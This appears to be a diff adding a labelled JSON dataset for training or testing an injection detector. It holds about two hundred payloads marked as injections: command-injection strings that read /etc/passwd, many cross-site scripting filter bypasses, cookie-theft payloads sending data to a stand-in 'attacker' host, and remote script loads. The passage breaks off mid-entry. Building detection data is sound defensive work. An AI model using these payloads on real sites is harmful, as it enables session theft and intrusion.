@@ -1,0 +1,1262 @@
+[
+    {
+        "payload": "/selector.png",
+        "injection": false
+    },
+    {
+        "payload": "; cat /etc/passwd",
+        "injection": true
+    },
+    {
+        "payload": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+        "injection": true
+    },
+    {
+        "payload": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+        "injection": true
+    },
+    {
+        "payload": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+        "injection": true
+    },
+    {
+        "payload": "%3Bcat%252B%252Fe%253F%253F%252Fpa%253F%253F%253Fd",
+        "injection": true
+    },
+    {
+        "payload": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+        "injection": true
+    },
+    {
+        "payload": "${7*7}",
+        "injection": true
+    },
+    {
+        "payload": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+        "injection": true
+    },
+    {
+        "payload": "%3Bcat%2B%2Fe%3F%3F%2Fpa%3F%3F%3Fd",
+        "injection": true
+    },
+    {
+        "payload": "<img src=1 onerror=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%3Csvg%3E%3Cscript%20xlink%3Ahref%3Ddata%3A%2Calert%281%29%20%2F%3E",
+        "injection": true
+    },
+    {
+        "payload": "[1].find(alert('1'))",
+        "injection": true
+    },
+    {
+        "payload": "%27%22%3E%3Cimg%2Fsrc%2Fonerror%3Dprompt%28%29%3Ejava%2526Tab%253bscript%3Aale%2526Tab%253brt%28%29%3Ciframe%20src%3Djavascript%3Aalert%28%29%2F%2F%3Cs%3Cscript%3Ecript%3Ealert%28%29%3C%2Fs%3Cscript%3Ecript%3E",
+        "injection": true
+    },
+    {
+        "payload": "/%3Cdiv%20id%3D%E2%80%9Dexample%E2%80%9D%20onclick%3D%E2%80%9Drunjs%28%E2%80%98userinput%26lt%3B%26quot%3B%E2%80%99%29%3B%E2%80%9D%3E",
+        "injection": true
+    },
+    {
+        "payload": "%2Balert(0x000123)%2B",
+        "injection": true
+    },
+    {
+        "payload": "/%22%3E%3Cscript%3Eeval%28new%20url%28document.location.href%2B%22%23javascript%3Aconfirm%2869%29%22%29.hash.slice%281%29%29%3C%2Fscript%3E",
+        "injection": true
+    },
+    {
+        "payload": "<body onpageshow=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "window.x%3D%5B%5D.with%3Bwindow.x%28%29.pop%28%29.alert%281337%29",
+        "injection": true
+    },
+    {
+        "payload": "%3Cform%2F%3E%3C%21%3E%3Cdetails%2Fopen%2Fontoggle%3Dalert%281%29%3E%22%0A%40gmail%0A.com",
+        "injection": true
+    },
+    {
+        "payload": "%3Cx%20onclick%3Dalert%281%29%3Eclick%20this%21",
+        "injection": true
+    },
+    {
+        "payload": "<%e2%80%aescript%e2%80%ae>alert%e2%80%ae(%e2%80%ae'1'%e2%80%ae)",
+        "injection": true
+    },
+    {
+        "payload": "<x contenteditable onblur=alert(1)>lose focus!",
+        "injection": true
+    },
+    {
+        "payload": "<svg><script href=data:,alert(1) />",
+        "injection": true
+    },
+    {
+        "payload": "<!<script>alert(1)</script>",
+        "injection": true
+    },
+    {
+        "payload": "%3Cmath%3E%3Cstyle%3E%20%20%20%20%3Cimg%20src%20onerror%3Dalert%282%29%3E%3C%2Fstyle%3E%3C%2Fmath%3E",
+        "injection": true
+    },
+    {
+        "payload": "('\\141\\154\\145\\162\\164\\50\\61\\51')()",
+        "injection": true
+    },
+    {
+        "payload": "<body onhelp=alert(1)>press F1!",
+        "injection": true
+    },
+    {
+        "payload": "%3Cscript%EF%BF%BD%3Ealert%EF%BF%BD%281%EF%BF%BD%29%20%EF%BF%BD%2F%EF%BF%BD%3E",
+        "injection": true
+    },
+    {
+        "payload": "top[8680439..toString(30)](1)",
+        "injection": true
+    },
+    {
+        "payload": "<svg><animate onrepeat='let test=document;location=`http://attacker?cookie=${test.cookie}`' attributeName=x dur=1s repeatCount=2 />&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "alert.call(null,1)",
+        "injection": true
+    },
+    {
+        "payload": "<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x",
+        "injection": true
+    },
+    {
+        "payload": "<x onmousemove=alert(1)>hover this!",
+        "injection": true
+    },
+    {
+        "payload": "<script>x=document.querySelector('form');x.setAttribute('method','GET');x.setAttribute('action','http://example.com/');</script>",
+        "injection": true
+    },
+    {
+        "payload": "eval(location.hash.slice(1)) #alert(1)",
+        "injection": true
+    },
+    {
+        "payload": "<script src=https://www.google.com/complete/search?client=chrome\\n%26jsonp=alert(1);></script>",
+        "injection": true
+    },
+    {
+        "payload": "%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0A%0D%0A\\n%3Cscript%3Ealert(1)%3C/script%3E",
+        "injection": true
+    },
+    {
+        "payload": "\\\"><script>alert(0x000123)</script>",
+        "injection": true
+    },
+    {
+        "payload": "<audio onloadeddata='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "`${class x extends `${alert`1337`}`{}}`{}",
+        "injection": true
+    },
+    {
+        "payload": "<audio controls autoplay onended='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "&lt;svg/onload&equals;alert(1)&gt;",
+        "injection": true
+    },
+    {
+        "payload": "</xmp><svg onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<svg/1='&q='onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<scr<script>ipt>alert(0x000123)</script>",
+        "injection": true
+    },
+    {
+        "payload": "<x contenteditable onkeydown=alert(1)>press any key!",
+        "injection": true
+    },
+    {
+        "payload": "</pre><svg onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<x oncopy=alert(1)>copy this!",
+        "injection": true
+    },
+    {
+        "payload": "\\\"></script><script >alert(0x000123)</script>",
+        "injection": true
+    },
+    {
+        "payload": "top%5B%5C%22al%5C%22%2B%5C%22ert%5C%22%5D%281%29",
+        "injection": true
+    },
+    {
+        "payload": "%27%27%3B%21-%5C%22%3CXSS%3E%3D%26%7B%28%29%7D",
+        "injection": true
+    },
+    {
+        "payload": "<form><input formaction=javascript:alert(1) type=image src=SOURCE>",
+        "injection": true
+    },
+    {
+        "payload": "setInterval`alert\\x28document.domain\\x29`",
+        "injection": true
+    },
+    {
+        "payload": "</textarea><svg onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<script/test>let test=document;location=`http://attacker?cookie=${test.cookie}`;</script/test>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "%22%3E%250D%250A%250D%250A%3Cx%20%27%3D%22foo%22%3E%3Cx%20foo%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28%60cloudfrontbypass%60%29%2F%2F%27%3E",
+        "injection": true
+    },
+    {
+        "payload": "'\\\"-></style)</xcript><script>alert(0x000123)</script)",
+        "injection": true
+    },
+    {
+        "payload": "%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E",
+        "injection": true
+    },
+    {
+        "payload": "<style>@keyframes slidein {}</style><a style='animation-duration:1s;animation-name:slidein;animation-iteration-count:2' onanimationiteration='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<input onpaste='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "\"onmouseover=alert(1)//",
+        "injection": true
+    },
+    {
+        "payload": "<input onkeypress='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "\\\"><img scr=0x94 onerror=alert(0x000123)>",
+        "injection": true
+    },
+    {
+        "payload": "<svg onload=alert%26%230000000040\"\")>>",
+        "injection": true
+    },
+    {
+        "payload": "/Orders/(A(%22onerror='alert%60xss%60'testabcd))/Login.aspx?ReturnUrl=/Orders",
+        "injection": true
+    },
+    {
+        "payload": "<audio autoplay controls onvolumechange='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<isindex action=javascript:alert(1) type=submit value=click>",
+        "injection": true
+    },
+    {
+        "payload": "<a href=javascript:alert(1)>click",
+        "injection": true
+    },
+    {
+        "payload": "al%5Cu0065rt%281%29",
+        "injection": true
+    },
+    {
+        "payload": "<script src=\"https://example.com/jsonp?callback=payload\">",
+        "injection": true
+    },
+    {
+        "payload": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
+        "injection": true
+    },
+    {
+        "payload": "/%3Cdiv%20id%3D%E2%80%9Dexample%E2%80%9D%20onclick%3D%E2%80%9Drunjs%28%E2%80%98userinput%E2%80%99%29%3Balert%28%E2%80%98test%E2%80%99%29%3B%E2%80%9D%3E",
+        "injection": true
+    },
+    {
+        "payload": "<script/x>alert(1)</script>",
+        "injection": true
+    },
+    {
+        "payload": "<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.domain)%27>",
+        "injection": true
+    },
+    {
+        "payload": "<script src=https://www.google.com/complete/search?client=chrome\\n%26jsonp=alert(1);></script>",
+        "injection": true
+    },
+    {
+        "payload": "<svg onload=\"alert(1)\"",
+        "injection": true
+    },
+    {
+        "payload": "('\\141\\154\\145\\162\\164\\50\\61\\51')()",
+        "injection": true
+    },
+    {
+        "payload": "<isindex formaction=javascript:alert(1) type=submit value=click>",
+        "injection": true
+    },
+    {
+        "payload": "<SVG ONLOAD=%26%2397%26%23108%26%23101%26%23114%26%23116(1)",
+        "injection": true
+    },
+    {
+        "payload": "*/alert(1)</script><script>/*",
+        "injection": true
+    },
+    {
+        "payload": "<html ontouchmove=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%3D%3Ca%20href%3D%27javascript%3Alet%20test%3Ddocument%3Blocation%3D%60http%3A%2F%2Fattacker%3Fcookie%3D%24%7Btest.cookie%7D%60%27%3Etest%3C%2Fa%3E%26password1%3D1%26enter%3D%25D0%259E%25D1%2582%25D0%25BF%25D1%2580%25D0%25B0%25D0%25B2%25D0%25B8%25D1%2582%25D1%258C%2B%25D0%25B7%25D0%25B0%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581",
+        "injection": true
+    },
+    {
+        "payload": "<x onmouseup=alert(1)>click this!",
+        "injection": true
+    },
+    {
+        "payload": "<svg><animate onend='let test=document;location=`http://attacker?cookie=${test.cookie}`' attributeName=x dur=1s>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<script src=data:,alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "\\\"><scr<script>alert(0x000123)</script>",
+        "injection": true
+    },
+    {
+        "payload": "<script src=//brutelogic.com.br/1.js>",
+        "injection": true
+    },
+    {
+        "payload": "(alert)(1)",
+        "injection": true
+    },
+    {
+        "payload": "top[/al/.source+/ert/.source](1)",
+        "injection": true
+    },
+    {
+        "payload": "prompt.call(null,1)",
+        "injection": true
+    },
+    {
+        "payload": "<iframe src=javascript:alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "\"autof<x>ocus o<x>nfocus=alert<x>(1)//",
+        "injection": true
+    },
+    {
+        "payload": "<svg on onload=(alert)(document.domain)>",
+        "injection": true
+    },
+    {
+        "payload": "class x extends `${class x extends `${alert`1337`}`{}}`{}",
+        "injection": true
+    },
+    {
+        "payload": "<x contenteditable onpaste=alert(1)>paste here!",
+        "injection": true
+    },
+    {
+        "payload": "<input onselect='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)' value='Hello,world!'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "/'''><iframe srcdoc='%26it;script>;prompt`${document.domain`%26it;/script>'>",
+        "injection": true
+    },
+    {
+        "payload": "\"onfocus=alert(1)//",
+        "injection": true
+    },
+    {
+        "payload": "<object data=javascript:alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<scr<script>ipt>alert(0x000123)<scr</script><ipt",
+        "injection": true
+    },
+    {
+        "payload": "'</style></script></script>alert(0x000123)</script>",
+        "injection": true
+    },
+    {
+        "payload": "<audio controls autoplay ontimeupdate='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<iframe src=javascript:alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<input oncopy='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)' value='Some date'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<x onmousedown=alert(1)>click this!",
+        "injection": true
+    },
+    {
+        "payload": "<script src=data:,alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%3Cxhzeem%20%20attr%3D%22%0A---%20%0Ax%3D%22%3D%3D%27%3D%27onmouseover%3Dconfirm%60xhzeem%60%20style%3D%22display%3Ablock%3Bwidth%3A1000px%3Bheight%3A1000px%3Bbackground%3Ared%22%3E%0A---%20%0A%22%3E",
+        "injection": true
+    },
+    {
+        "payload": "confirm.call(null,1)",
+        "injection": true
+    },
+    {
+        "payload": "</iframe><svg onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%3Cscript%3E%5Bonerror%5D%3D%5Balert%5D%3Bthrow%201%3C%2Fscript%3E",
+        "injection": true
+    },
+    {
+        "payload": "\"o<x>nmouseover=alert<x>(1)//",
+        "injection": true
+    },
+    {
+        "payload": "<input onkeydown='let test=document;location=`http://example.com?cookie=${test.cookie}`'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<input onkeyup='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<style>@keyframes x{}</style><a style='animation-name:x' onanimationend='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<audio src onloadstart=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "/(A('onerror=%22alert%601%60%22testabcd))/",
+        "injection": true
+    },
+    {
+        "payload": "<audio controls autoplay onplay='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "/%5B1%2C2%2C3%5D.with%280%2Calert%29.shift%28%29%281%29",
+        "injection": true
+    },
+    {
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<style>@keyframes x{}</style><a style='animation-name:x' onanimationstart='let test=document;location=`http://attacker?cookie=${test.cookie}`'></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>",
+        "injection": true
+    },
+    {
+        "payload": "<form><input formaction=javascript:alert(1) type=image value=click>",
+        "injection": true
+    },
+    {
+        "payload": "'\"</Script><Html /Onmouseover=(alert)(1) //",
+        "injection": true
+    },
+    {
+        "payload": "<p draggable='true' ondrag='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'>Drag this text</p>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<form><input oninvalid='let test=document;location=`http://attacker?cookie=${test.cookie}`' required><input type=submit>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "/%3Ca%20href%3D%22https%3A%2F%2Fexample.com%2F%250aalert%281%29%22%20onclick%3D%22protocol%3D%27javascript%3A%27%22%3Ea%3C%2Fa%3E",
+        "injection": true
+    },
+    {
+        "payload": "<x ng-app>{{constructor.constructor('alert(1)')()}}",
+        "injection": true
+    },
+    {
+        "payload": "<input onchange='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "eval(url.slice(-8)) #alert(1)",
+        "injection": true
+    },
+    {
+        "payload": "<x ondrag=alert(1)>drag this!",
+        "injection": true
+    },
+    {
+        "payload": "<Svg OnLoad=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<svg onload=alert&lpar;1&rpar;>",
+        "injection": true
+    },
+    {
+        "payload": "'>alert(1)</script><script/1='",
+        "injection": true
+    },
+    {
+        "payload": "<svg onload=alert(1)//",
+        "injection": true
+    },
+    {
+        "payload": "<script src=\"https://example.com/angularjs/1.1.3/angularjs.min.js\"><div ng-app ng-csp id=p ng-click=$event.view.alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "alert.call(%2520%2C%20%22XSS%22)%3B",
+        "injection": true
+    },
+    {
+        "payload": "%252sscript%252ualert%28%271%27%29%252s%2Fscript%252u",
+        "injection": true
+    },
+    {
+        "payload": "';alert(0x000123)'",
+        "injection": true
+    },
+    {
+        "payload": "<x contenteditable onfocus=alert(1)>focus this!",
+        "injection": true
+    },
+    {
+        "payload": "</script></script><script>alert(0x000123)</script>",
+        "injection": true
+    },
+    {
+        "payload": "<%09script%09>alert%09(%09'1'%09)",
+        "injection": true
+    },
+    {
+        "payload": "{{constructor.constructor('alert(1)')()}}",
+        "injection": true
+    },
+    {
+        "payload": "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>",
+        "injection": true
+    },
+    {
+        "payload": "<input oninput='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "\"autofocus=alert(1)//",
+        "injection": true
+    },
+    {
+        "payload": "<audio autoplay controls onseeking='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "</script><svg onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<body onfocus=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<a href='java%09script:let test=document;location=`http://attacker?cookie=${test.cookie}`'>TEST</a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "x%3Dnew%20XMLHttpRequest%28%29%3B%20http%3A%2F%2Fx.open%28%27GET%27%2C%27%2F%2Fhost%2Fphpinfo%27%2C0%29%3B%20x.send%28%29%3Bregex%3D%2FCOOKIE%27.%2Av%22%3E%28.%2A%3F%29%3C%2Fm%3B%20alert%28x.responseText.match%28regex%29%5B1%5D%29%3B",
+        "injection": true
+    },
+    {
+        "payload": "<x onmouseover=alert(1)>hover this!",
+        "injection": true
+    },
+    {
+        "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
+        "injection": true
+    },
+    {
+        "payload": "<audio oncanplay='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "'%2Balert(0x000123)%2B'",
+        "injection": true
+    },
+    {
+        "payload": "<audio controls autoplay onplaying='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\" src=\"//brutelogic.com.br/1.js\"/>",
+        "injection": true
+    },
+    {
+        "payload": "%3Cx%20oncontextmenu%3Dalert%281%29%3Eright%20click%20this%21",
+        "injection": true
+    },
+    {
+        "payload": "%3Cbody%20onhashchange%3Dalert%281%29%3E%3Ca%20href%3D%2523x%3Eclick%20this%21%23x",
+        "injection": true
+    },
+    {
+        "payload": "\\'-alert(1)//",
+        "injection": true
+    },
+    {
+        "payload": "<svg onload=alert%26%230000000040\"1\")>",
+        "injection": true
+    },
+    {
+        "payload": "%3Cstyle%3E%2A%7Bbackground-image%3Aurl%28%27%5C6A%5C61%5C76%5C61%5C73%5C63%5C72%5C69%5C70%5C74%5C3A%5C61%5C6C%5C65%5C72%5C74%5C28%5C6C%5C6F%5C63%5C61%5C74%5C69%5C6F%5C6E%5C29%27%29%7D%3C%2Fstyle%3E",
+        "injection": true
+    },
+    {
+        "payload": "<a href=\"j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()\">x</a>",
+        "injection": true
+    },
+    {
+        "payload": "<body onorientationchange=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<embed src=javascript:alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<a href='javascript%09:let test=document;location=`http://attacker?cookie=${test.cookie}`'>TEST</a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "prompt.call(null%25252C1)",
+        "injection": true
+    },
+    {
+        "payload": "</title><svg onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "let%20a%20%3D%20document.createElement%28%27a%27%29%3B%0Aa.href%3D%27http%3A%2F%2Fexample.com%2F%250aalert%281%29%2F%2F%27%3B%0Aa.protocol%3D%27javascript%3A%27%3B%0Adocument.body.append%28a%29%3B%0Ahttp%3A%2F%2Fa.click%28%29%3B",
+        "injection": true
+    },
+    {
+        "payload": "<svg><script+href='data:text/javascript,let+test=document;location=`http://attacker?cookie=${test.cookie}`'+/>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<math><brute xlink:href=javascript:alert(1)>click",
+        "injection": true
+    },
+    {
+        "payload": "(A(%22onerror='alert%601%60'testabcd))/Login.aspx?ReturnUrl=%2f",
+        "injection": true
+    },
+    {
+        "payload": "<form><input formaction=javascript:alert(1) type=submit value=click>",
+        "injection": true
+    },
+    {
+        "payload": "<marquee loop=1 width=0 onfinish=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%3Chtml%20ontouchstart%3Dalert%281%29%3E",
+        "injection": true
+    },
+    {
+        "payload": "<img onwheel='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'/src='ssss'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<math><brute href=javascript:alert(1)>click",
+        "injection": true
+    },
+    {
+        "payload": "' alert(0x000123) '",
+        "injection": true
+    },
+    {
+        "payload": "<menu id=x contextmenu=x onshow=alert(1)>right click me!",
+        "injection": true
+    },
+    {
+        "payload": "%3Cscript%3Ealert%26Tab%3b%281%29",
+        "injection": true
+    },
+    {
+        "payload": "a%3D%5Blocation.origin%2C%20%27%0A%40example%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B",
+        "injection": true
+    },
+    {
+        "payload": "x%3Dnew%20XMLHttpRequest%28%29%3B%20http%3A%2F%2Fx.open%28%27GET%27%2C%27%2Fphpinfo%27%2C0%29%3B%20x.send%28%29%3Bregex%3D%2FCOOKIE%27.%2Av%22%3E%28.%2A%3F%29%3C%2Fm%3B%20alert%28x.responseText.match%28regex%29%5B1%5D%29%3B",
+        "injection": true
+    },
+    {
+        "payload": "<a href='java%0ascript:let test=document;location=`http://attacker?cookie=${test.cookie}`'>TEST</a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%3Csvg%2Fonload%3Dalert%28%RND%%29%2F%2F",
+        "injection": true
+    },
+    {
+        "payload": "</style><svg onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%27%22%3E%3Csvg%2Fonload%3Dalert%28%29%3E%7B%7B7%2A7%7D%7D",
+        "injection": true
+    },
+    {
+        "payload": "%3Csvg%3E%3Cstyle%3E%20%20%20%20%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fstyle%3E%3C%2Fsvg%3E",
+        "injection": true
+    },
+    {
+        "payload": "<x ondblclick=alert(1)>double click this!",
+        "injection": true
+    },
+    {
+        "payload": "<form onsubmit=alert(1)><input type=submit>",
+        "injection": true
+    },
+    {
+        "payload": "\\\"><0x000123>",
+        "injection": true
+    },
+    {
+        "payload": "\\\"><BODY ONLOAD=alert(0x000123)>",
+        "injection": true
+    },
+    {
